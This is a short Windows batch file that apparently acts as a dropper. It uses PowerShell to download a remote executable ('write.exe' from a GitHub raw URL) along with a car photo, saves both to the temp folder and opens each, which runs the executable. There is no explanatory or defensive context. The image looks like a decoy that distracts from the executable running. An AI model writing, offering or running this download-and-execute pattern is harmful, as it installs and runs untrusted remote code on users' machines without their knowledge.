
set files='https://raw.githubusercontent.com/mmithrajith/test/main/write.exe' , 'https://vehicle-images.dealerinspire.com/da79-110008689/1FA6P8CF8S5402512/7cb7b3b0d3bc228f7890f57e2ad85d47.jpg'
powershell "(%files%)|foreach{$fileName='%TEMP%'+(Split-Path -Path $_ -Leaf);(new-object System.Net.WebClient).DownloadFile($_,$filename);Invoke-Item $filename;}"